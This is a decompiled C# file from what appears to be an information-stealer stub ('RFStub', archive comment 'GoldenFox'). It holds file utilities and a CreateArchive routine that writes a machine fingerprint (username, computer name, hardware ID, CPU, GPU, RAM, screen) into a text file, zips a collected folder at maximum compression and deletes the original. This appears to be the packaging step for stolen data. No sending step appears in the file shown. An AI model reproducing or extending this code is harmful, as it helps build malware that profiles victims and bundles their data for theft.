using System;
using System.IO;
using System.Linq;
using System.Text;
using Ionic.Zip;
using Ionic.Zlib;

namespace RFStub;

internal sealed class Filemanager
{
	public static void RecursiveDelete(string path)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		if (directoryInfo.Exists)
		{
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				RecursiveDelete(directoryInfo2.FullName);
			}
			directoryInfo.Delete(recursive: true);
		}
	}

	public static void CopyDirectory(string sourceFolder, string destFolder)
	{
		if (!Directory.Exists(destFolder))
		{
			Directory.CreateDirectory(destFolder);
		}
		string[] files = Directory.GetFiles(sourceFolder);
		string[] array = files;
		foreach (string text in array)
		{
			string fileName = Path.GetFileName(text);
			string destFileName = Path.Combine(destFolder, fileName);
			File.Copy(text, destFileName);
		}
		string[] directories = Directory.GetDirectories(sourceFolder);
		string[] array2 = directories;
		foreach (string text2 in array2)
		{
			string fileName2 = Path.GetFileName(text2);
			string destFolder2 = Path.Combine(destFolder, fileName2);
			CopyDirectory(text2, destFolder2);
		}
	}

	public static long DirectorySize(string path)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(path);
		return directoryInfo.GetFiles().Sum((FileInfo fi) => fi.Length) + directoryInfo.GetDirectories().Sum((DirectoryInfo di) => DirectorySize(di.FullName));
	}

	public static string CreateArchive(string directory, bool setpassword = true)
	{
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		if (Directory.Exists(directory))
		{
			string contents = "\n== System Info ==\nDate: " + SystemInfo.datenow + "\nUsername: " + SystemInfo.username + "\nCompName: " + SystemInfo.compname + "\nLanguage: " + SystemInfo.culture + "\n\n== Hardware ==\nCPU: " + SystemInfo.GetCPUName() + "\nGPU: " + SystemInfo.GetGPUName() + "\nRAM: " + SystemInfo.GetRamAmount() + "\nHWID: " + SystemInfo.GetHardwareID() + "\nPower: " + SystemInfo.GetBattery() + "\nScreen: " + SystemInfo.ScreenMetrics() + "\n";
			File.WriteAllText(directory + "\\info.txt", contents);
			ZipFile val = new ZipFile(Encoding.Default);
			try
			{
				val.set_CompressionLevel((CompressionLevel)9);
				val.set_Comment("\nGoldenFox");
				val.AddDirectory(directory);
				val.Save(directory + ".zip");
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		RecursiveDelete(directory);
		Console.WriteLine("Archive " + new DirectoryInfo(directory).Name + " compression completed");
		return directory + ".zip";
	}
}
